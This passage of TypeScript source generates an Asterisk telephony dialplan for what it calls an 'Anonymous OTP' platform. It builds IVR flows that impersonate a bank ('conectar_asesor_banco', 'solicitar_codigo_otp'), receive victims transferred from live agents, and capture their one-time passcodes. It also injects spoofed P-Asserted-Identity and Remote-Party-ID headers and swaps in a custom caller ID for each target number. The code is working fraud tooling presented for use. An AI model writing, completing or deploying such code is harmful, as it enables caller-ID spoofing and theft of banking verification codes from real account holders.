        if (authMatch) current.auth = authMatch[1];
      } else if (trimmed.startsWith('Aor:')) {
        const aorMatch = trimmed.match(/Aor:\s*([^\s]+)/);
        if (aorMatch) current.aor = aorMatch[1];
      } else if (trimmed.startsWith('Contact:')) {
        const contactMatch = trimmed.match(/Contact:\s*([^\s]+)\s+([0-9a-fA-F]+)?\s*([A-Za-z]+)?\s*([\d.]+)?/);
        if (contactMatch) {
          current.contact = contactMatch[1] || '';
          current.contactStatus = contactMatch[3] || '';
          current.rtt = contactMatch[4] ? `${contactMatch[4]}ms` : '';
          if (trimmed.includes('Avail')) {
            current.status = 'registered';
          }
        }
      }
    }
  }
  if (current) endpoints.push(current);

  return { raw: output, parsed: endpoints };
}

// Generate clean Asterisk extensions.conf (Dialplan) with complete routing and IVR capture
function generateCleanDialplanConf(
  activeCarrier = 'televox',
  carrierHost = 'televox.carrier.net',
  audios: { audioIntro?: string; audioPrompt?: string; audioWait?: string; audioSuccess?: string; audioAgent?: string } = {}
): string {
  let dialplanContent = `; ========================================================\n`;
  dialplanContent += `; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP\n`;
  dialplanContent += `; Auto-generado por Anonymous OTP Asterisk Platform\n`;
  dialplanContent += `; ========================================================\n\n`;
  dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;

  const chosenIntro = audios.audioIntro || 'custom/bienvenida_corporativa';
  const chosenPrompt = audios.audioPrompt || 'custom/solicitar_codigo_otp';
  const chosenWait = audios.audioWait || 'custom/un_momento_validando_informacion';
  const chosenSuccess = audios.audioSuccess || 'custom/operacion_bloqueada_exito';
  const chosenAgent = audios.audioAgent || 'custom/conectar_asesor_banco';

  dialplanContent += `[globals]\n`;
  dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
  dialplanContent += `GLOBAL_DEFAULT_INTRO=${chosenIntro}\n`;
  dialplanContent += `GLOBAL_DEFAULT_PROMPT=${chosenPrompt}\n`;
  dialplanContent += `GLOBAL_DEFAULT_WAIT=${chosenWait}\n`;
  dialplanContent += `GLOBAL_DEFAULT_SUCCESS=${chosenSuccess}\n`;
  dialplanContent += `GLOBAL_DEFAULT_AGENT=${chosenAgent}\n\n`;

  dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
  dialplanContent += `[sub-pjsip-headers]\n`;
  dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)\n`;
  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)\n`;
  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>\\;party=calling\\;screen=yes\\;privacy=off)\n`;
  dialplanContent += ` same => n,Return()\n\n`;

  dialplanContent += `[from-internal]\n`;
  dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
  dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  // 2a. Extensiones Dedicadas de Captura OTP al Transferir (Extensiones 3333, 4444, 5555, 6666, 7777 y 777)
  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 3333)\n`;
  dialplanContent += `exten => 3333,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 3333 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/3333)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 3333] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-3333,s,1)\n\n`;

  dialplanContent += `exten => 333,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 333 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/3333)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 333] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-3333,s,1)\n\n`;

  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 4444)\n`;
  dialplanContent += `exten => 4444,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 4444 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/4444)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 4444] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-4444,s,1)\n\n`;

  dialplanContent += `exten => 444,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 444 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/4444)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 444] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-4444,s,1)\n\n`;

  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 5555)\n`;
  dialplanContent += `exten => 5555,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 5555 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/5555)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 5555] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-5555,s,1)\n\n`;

  dialplanContent += `exten => 555,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 555 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/5555)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 555] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-5555,s,1)\n\n`;

  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 6666)\n`;
  dialplanContent += `exten => 6666,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 6666 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/6666)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 6666] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-6666,s,1)\n\n`;

  dialplanContent += `exten => 666,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 666 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/6666)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 666] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo-6666,s,1)\n\n`;

  dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777)\n`;
  dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;

  dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;

  dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
  dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(__IVR_AGENT_EXTEN=1001)\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;

  dialplanContent += `; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
  dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n`;
  dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;

  dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
  dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
